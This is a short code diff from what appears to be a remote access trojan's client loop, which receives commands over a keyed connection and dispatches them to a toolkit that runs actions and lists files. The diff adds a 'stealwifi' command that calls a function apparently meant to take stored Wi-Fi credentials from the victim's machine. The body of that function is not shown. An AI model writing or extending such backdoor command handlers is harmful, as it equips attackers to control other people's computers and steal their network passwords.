@@ -73,6 +73,9 @@ def client_loop(conn, dhkey):
         elif cmd == 'execute':
             results = toolkit.execute(action)
 
+        elif cmd == 'stealwifi':
+            results = toolkit.stealwifi(PLAT)
+
         elif cmd == 'ls':
             results = toolkit.ls(action, PLAT)
 
